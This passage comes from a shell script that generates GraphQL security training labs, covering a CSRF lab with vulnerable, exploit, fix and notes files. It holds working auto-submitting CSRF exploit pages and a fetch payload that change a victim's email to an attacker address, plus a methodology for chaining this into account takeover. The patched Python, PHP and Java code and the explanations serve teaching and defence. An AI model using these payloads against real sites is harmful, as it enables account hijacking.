# Host on attacker server; victim visits page and auto-submits:
<form method="POST" action="https://victim.com/graphql">
  <input name="query" value='mutation{changeEmail(email:"attacker@evil.com"){email}}'>
</form>
<script>document.forms[0].submit()</script>

# Vector 3: Fetch with x-www-form-urlencoded (no preflight if content-type is simple)
fetch("https://victim.com/graphql", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: 'query=mutation{changeEmail(email:"attacker@evil.com"){email}}'
})

# Note: application/json triggers CORS preflight — but form-urlencoded does NOT.
EOF

mf "$L/exploit/request.txt" << 'EOF'
# ── Exploit HTML page hosted on attacker.com ─────────────────────────────────
<!DOCTYPE html>
<html>
<body>
  <h1>You've won a prize! Click anywhere...</h1>
  <form id="csrf-form" method="POST" action="https://victim.com/graphql"
        enctype="application/x-www-form-urlencoded">
    <input name="query"
           value='mutation { changeEmail(email: "attacker@evil.com") { email } }'>
  </form>
  <script>document.getElementById("csrf-form").submit();</script>
</body>
</html>

# Raw request sent cross-origin:
POST /graphql HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=victim-session-token   ← browser auto-attaches
Origin: https://attacker.com

query=mutation+%7B+changeEmail%28email%3A+%22attacker%40evil.com%22%29+%7B+email+%7D+%7D
EOF

mf "$L/exploit/response.txt" << 'EOF'
HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "changeEmail": {
      "email": "attacker@evil.com"
    }
  }
}

# Result: admin account email changed to attacker@evil.com
# Attacker now triggers "forgot password" → full account takeover
EOF

mf "$L/fix/fix.py" << 'EOF'
"""
FIX:
1. Only accept application/json Content-Type (blocks form-based CSRF).
2. Require custom header X-Requested-With (triggers CORS preflight).
3. Set SameSite=Strict on session cookie.
4. Add CSRF token for extra defence-in-depth.
5. Disable GET method for mutations.
"""
from flask import Flask, request, jsonify, make_response, session
from graphql import build_schema, graphql_sync
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

USERS = {1: {"id":1,"username":"admin","email":"admin@corp.com"}}

schema = build_schema("""
    type Query  { getUser(id: Int!): User  getCsrfToken: String }
    type Mutation { changeEmail(email: String!): User }
    type User   { id: Int  username: String  email: String }
""")

def validate_csrf(req):
    """
    Primary defence: Content-Type: application/json is enough to trigger
    CORS preflight. Belt-and-suspenders: also check custom header.
    """
    if req.content_type != "application/json":
        raise Exception("Invalid content type")
    custom_header = req.headers.get("X-Requested-With","")
    if custom_header != "XMLHttpRequest":
        raise Exception("Missing X-Requested-With header")

def resolve_change_email(root, info, email):
    validate_csrf(info.context["request"])  # FIX
    USERS[1]["email"] = email
    return USERS[1]

def resolve_get_csrf_token(root, info):
    token = secrets.token_hex(16)
    session["csrf_token"] = token
    return token

root_value = {
    "getUser": lambda r, i, id: USERS.get(id),
    "getCsrfToken": resolve_get_csrf_token,
    "changeEmail": resolve_change_email,
}

@app.route("/graphql", methods=["POST"])  # FIX: POST only
def graphql_endpoint():
    # FIX: enforce JSON content-type (blocks form-encoded CSRF)
    if not request.is_json:
        return jsonify({"errors":[{"message":"Content-Type must be application/json"}]}), 415
    data = request.get_json()
    result = graphql_sync(schema, data["query"], root_value=root_value,
                          context_value={"request": request})
    resp = make_response(jsonify(result.data))
    # FIX: SameSite=Strict prevents cross-origin cookie sending
    resp.set_cookie("session", "user-session-token",
                    samesite="Strict", secure=True, httponly=True)
    return resp

if __name__ == "__main__":
    app.run()
EOF

mf "$L/fix/fix.php" << 'EOF'
<?php
/**
 * FIX:
 * 1. Only POST + application/json accepted.
 * 2. SameSite=Strict cookie.
 * 3. Custom CSRF header required.
 * 4. GET method returns 405.
 */
require 'vendor/autoload.php';

use GraphQL\GraphQL;
use GraphQL\Type\Schema;
use GraphQL\Type\Definition\{ObjectType, Type};

// FIX: reject non-POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['errors'=>[['message'=>'Method Not Allowed']]]);
    exit;
}

// FIX: enforce application/json (form-based CSRF uses form-urlencoded)
if (!str_contains($_SERVER['CONTENT_TYPE'] ?? '', 'application/json')) {
    http_response_code(415);
    echo json_encode(['errors'=>[['message'=>'Content-Type must be application/json']]]);
    exit;
}

// FIX: require custom header (triggers CORS preflight for cross-origin)
if (($_SERVER['HTTP_X_REQUESTED_WITH'] ?? '') !== 'XMLHttpRequest') {
    http_response_code(403);
    echo json_encode(['errors'=>[['message'=>'Missing X-Requested-With header']]]);
    exit;
}

// FIX: SameSite=Strict cookie
setcookie('session', 'user-session-token', [
    'samesite' => 'Strict',
    'secure'   => true,
    'httponly' => true,
]);

$users = [1 => ['id'=>1,'username'=>'admin','email'=>'admin@corp.com']];

$userType = new ObjectType(['name'=>'User','fields'=>[
    'id'=>['type'=>Type::int()],'username'=>['type'=>Type::string()],'email'=>['type'=>Type::string()]
]]);
$queryType    = new ObjectType(['name'=>'Query','fields'=>[
    'getUser'=>['type'=>$userType,'args'=>['id'=>['type'=>Type::nonNull(Type::int())]],
        'resolve'=>fn($r,$a) => $users[$a['id']] ?? null],
]]);
$mutationType = new ObjectType(['name'=>'Mutation','fields'=>[
    'changeEmail'=>['type'=>$userType,'args'=>['email'=>['type'=>Type::nonNull(Type::string())]],
        'resolve'=>function($r,$args) use (&$users){
            $users[1]['email']=$args['email']; return $users[1];
        }],
]]);

$schema = new Schema(['query'=>$queryType,'mutation'=>$mutationType]);
$input  = json_decode(file_get_contents('php://input'), true);
$result = GraphQL::executeQuery($schema, $input['query'] ?? '');
header('Content-Type: application/json');
echo json_encode($result->toArray());
EOF

mf "$L/fix/fix.java" << 'EOF'
// FIX: CSRF protection via:
// 1. JSON-only content type enforcement (Spring filter)
// 2. SameSite=Strict session cookie
// 3. Custom header requirement (X-Requested-With)
package com.lab.graphql;

import jakarta.servlet.*;
import jakarta.servlet.http.*;
import org.springframework.boot.web.servlet.FilterRegistrationBean;
import org.springframework.context.annotation.*;
import org.springframework.graphql.data.method.annotation.*;
import org.springframework.session.web.http.DefaultCookieSerializer;
import org.springframework.stereotype.Controller;
import java.io.IOException;
import java.util.*;

record User(int id, String username, String email) {}

@Controller
public class SecureMutationController {

    private final Map<Integer, User> users = new HashMap<>(Map.of(
        1, new User(1, "admin", "admin@corp.com")
    ));

    @MutationMapping
    public User changeEmail(@Argument String email) {
        users.put(1, new User(1, "admin", email));
        return users.get(1);
    }
}

@Configuration
class SecurityConfig {

    // FIX: enforce JSON content-type — blocks form-based CSRF
    @Bean
    public FilterRegistrationBean<Filter> contentTypeFilter() {
        FilterRegistrationBean<Filter> bean = new FilterRegistrationBean<>();
        bean.setFilter(new Filter() {
            @Override
            public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
                    throws IOException, ServletException {
                HttpServletRequest httpReq = (HttpServletRequest) req;
                HttpServletResponse httpRes = (HttpServletResponse) res;
                String ct = httpReq.getContentType();
                String xrw = httpReq.getHeader("X-Requested-With");
                if ("POST".equals(httpReq.getMethod()) &&
                    httpReq.getRequestURI().contains("/graphql")) {
                    if (ct == null || !ct.contains("application/json")) {
                        httpRes.sendError(415, "Content-Type must be application/json");
                        return;
                    }
                    if (!"XMLHttpRequest".equals(xrw)) {
                        httpRes.sendError(403, "Missing X-Requested-With header");
                        return;
                    }
                }
                chain.doFilter(req, res);
            }
        });
        bean.addUrlPatterns("/graphql");
        return bean;
    }

    // FIX: SameSite=Strict cookie
    @Bean
    public DefaultCookieSerializer cookieSerializer() {
        DefaultCookieSerializer s = new DefaultCookieSerializer();
        s.setSameSite("Strict");
        s.setUseSecureCookie(true);
        s.setUseHttpOnlyCookie(true);
        return s;
    }
}

// application.properties:
// server.servlet.session.cookie.same-site=strict
// spring.graphql.http.get.enabled=false
EOF

mf "$L/notes/explanation.txt" << 'EOF'
LAB 5 — Performing CSRF Exploits over GraphQL
==============================================

VULNERABILITY CLASS : Cross-Site Request Forgery (OWASP A01:2021)
CVSS ESTIMATE       : 8.8 (High) — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

ROOT CAUSE
----------
CSRF exploits the browser's automatic cookie-attachment behavior.
A malicious page on attacker.com can make the victim's browser send a request
to victim.com — with the victim's session cookie attached — IF:

  1. The server accepts simple request content types (form-urlencoded, text/plain).
  2. The session cookie is SameSite=None (or not set, which defaults to Lax on
     modern browsers — but GET is still allowed under Lax).
  3. No CSRF token or custom header is validated.

GraphQL's default content type (application/json) triggers a CORS preflight,
which provides inherent CSRF protection. However if the server ALSO accepts:
  • application/x-www-form-urlencoded → no preflight → CSRF possible
  • text/plain → no preflight → CSRF possible
  • GET method → no preflight → CSRF possible

IMPACT
------
- Change victim's email address → password reset → full account takeover.
- Delete victim's account.
- Perform any authenticated action on behalf of the victim.

REMEDIATION
-----------
1. ONLY accept application/json — never form-encoded or plain text.
2. Set SameSite=Strict on all session cookies.
3. Require X-Requested-With: XMLHttpRequest custom header.
4. Implement CSRF token (double-submit cookie pattern) as defence-in-depth.
5. Disable GET method for GraphQL endpoint entirely.
6. Enforce strict CORS policy (allowed origins whitelist).
EOF

mf "$L/notes/methodology.txt" << 'EOF'
LAB 5 — Methodology
====================

STEP 1 — IDENTIFY CSRF CONDITIONS
  • Does the endpoint accept GET with query param? → automatic CSRF.
  • Does the endpoint accept application/x-www-form-urlencoded? → CSRF.
  • Does the session cookie have SameSite=None or missing SameSite? → CSRF.
  • Is there a CSRF token in the request? → if missing → CSRF.

STEP 2 — IDENTIFY VALUABLE MUTATIONS
  • changeEmail / changePassword → account takeover.
  • deleteAccount / disableUser → destructive.
  • addAdmin / elevateRole → privilege escalation.
  • transferFunds / placeOrder → financial impact.

STEP 3 — BUILD EXPLOIT PAGE
  a) GET-based: <img src="https://victim/graphql?query=mutation{...}">
  b) Form-based:
     <form method="POST" action="https://victim/graphql"
           enctype="application/x-www-form-urlencoded">
       <input name="query" value="mutation{changeEmail(email:'x@evil.com'){email}}">
     </form>
     <script>document.forms[0].submit()</script>

STEP 4 — TEST
  • Host exploit page on a different origin.
  • Log in to victim app in same browser.
  • Visit exploit page → mutation should execute cross-origin.

STEP 5 — CHAIN FOR TAKEOVER
  • CSRF to changeEmail → trigger password reset → receive reset link → log in.

TOOLS
  • Burp Suite (CSRF PoC Generator — right-click request → Engagement tools)
  • OWASP CSRFTester
EOF

mf "$L/README.md" << 'EOF'
# Lab 5 — Performing CSRF Exploits over GraphQL (PRACTITIONER)

## Vulnerability
GraphQL mutation accessible via GET and form-encoded POST without CSRF
token validation — allows cross-site request forgery attacks.

## Quick Exploit
```html
<!-- Host on attacker.com — victim visits page while logged into victim.com -->
<form method="POST" action="https://victim.com/graphql"
      enctype="application/x-www-form-urlencoded">
  <input name="query"
         value='mutation { changeEmail(email: "attacker@evil.com") { email } }'>
</form>
<script>document.forms[0].submit()</script>
```

## Fix (one-liner)
Only accept `Content-Type: application/json` — this alone triggers a CORS
preflight that blocks cross-origin form submissions.
EOF


# =============================================================================
#  DONE
# =============================================================================
echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║  GraphQL Labs Structure Created Successfully                     ║"
echo "╠══════════════════════════════════════════════════════════════════╣"
echo "║  Labs:                                                           ║"
echo "║   1. graphql-private-posts          (APPRENTICE)                 ║"
echo "║   2. graphql-accidental-field-exposure (PRACTITIONER)            ║"
echo "║   3. graphql-hidden-endpoint        (PRACTITIONER)               ║"
echo "║   4. graphql-brute-force-bypass     (PRACTITIONER)               ║"
echo "║   5. graphql-csrf                   (PRACTITIONER)               ║"
echo "╠══════════════════════════════════════════════════════════════════╣"
echo "║  Each lab contains:                                              ║"
echo "║   vuln/   → vulnerable code (Python, PHP, Java)                 ║"
echo "║   fix/    → patched code    (Python, PHP, Java)                 ║"
echo "║   exploit/→ payloads + raw request/response                     ║"
echo "║   notes/  → explanation + methodology                           ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
EOF
